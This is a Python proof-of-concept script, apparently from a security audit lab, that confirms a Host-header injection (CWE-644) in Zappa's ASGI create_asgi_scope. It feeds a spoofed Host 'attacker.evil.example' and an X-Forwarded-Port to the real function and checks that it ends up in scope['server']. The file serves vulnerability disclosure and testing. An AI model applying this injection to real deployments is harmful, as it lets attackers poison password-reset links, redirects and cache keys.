#!/usr/bin/env python3
"""VULN-025 — ASGI scope["server"] taken from the client Host (host injection for ASGI apps).

Vulnerable code : targets/Zappa/zappa/asgi.py:54-60, :77 (create_asgi_scope)
Vulnerability   : CWE-644 Host-header injection (ASGI variant).
Surface         : A (HTTP request path) when the app is ASGI (`app_type: asgi`).

Mechanism (plain English)
-------------------------
Unlike the WSGI path, which pins `SERVER_NAME = "zappa"` (wsgi.py:73),
`create_asgi_scope` derives the ASGI `scope["server"]` host from the client Host
header with no validation:

    host = lower_headers.get("host", server_name)      # asgi.py:55  (client-controlled)
    port_header = lower_headers.get("x-forwarded-port", "443")
    ...
    scope["server"] = (host, port)                     # asgi.py:77

Starlette/FastAPI derive `request.url`, `url_for`, and absolute redirects from
`scope["server"]`, so a client Host poisons every absolute URL the app builds
(reset links, redirects, cache keys) — the ASGI sibling of VULN-004/010.

What a successful run proves
----------------------------
Driving the real `create_asgi_scope` with an attacker Host yields
`scope["server"] == ("attacker.evil.example", <client port>)`.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, lab_python, log, verdict

VULN = "VULN-025"
EVIL = "attacker.evil.example"

_DRIVER = r"""
import json
from zappa.asgi import create_asgi_scope
event = {
    "httpMethod": "GET", "path": "/", "requestContext": {"identity": {}},
    "headers": {"Host": "attacker.evil.example", "X-Forwarded-Port": "8443"},
    "multiValueHeaders": {"Host": ["attacker.evil.example"], "X-Forwarded-Port": ["8443"]},
}
scope = create_asgi_scope(event, script_name="")     # <-- REAL target code
print(json.dumps({"server": list(scope["server"])}))
"""


def main():
    banner(VULN, "ASGI scope['server'] taken from client Host (host injection)",
           "zappa/asgi.py:55,77 create_asgi_scope")

    log("STEP", f"driving create_asgi_scope with Host: {EVIL} and X-Forwarded-Port: 8443")
    cp = lab_python(_DRIVER)
    server = json.loads(cp.stdout.decode().strip().splitlines()[-1])["server"]
    log("INFO", f"scope['server'] = {server}")

    if server[0] == EVIL:
        log("PROOF", f"scope['server'] host is the attacker-supplied {EVIL!r} (port {server[1]} from "
                     f"X-Forwarded-Port) — unlike WSGI which pins SERVER_NAME='zappa'. An ASGI "
                     f"(Starlette/FastAPI) app derives absolute URLs from this, so the client poisons "
                     f"reset links / redirects / cache keys.")
        log("OK", "exploit confirmed — client Host controls ASGI scope['server']")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — client Host -> ASGI scope['server'] (host injection)")
        return 0
    log("FAIL", f"scope server host = {server[0]!r}")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
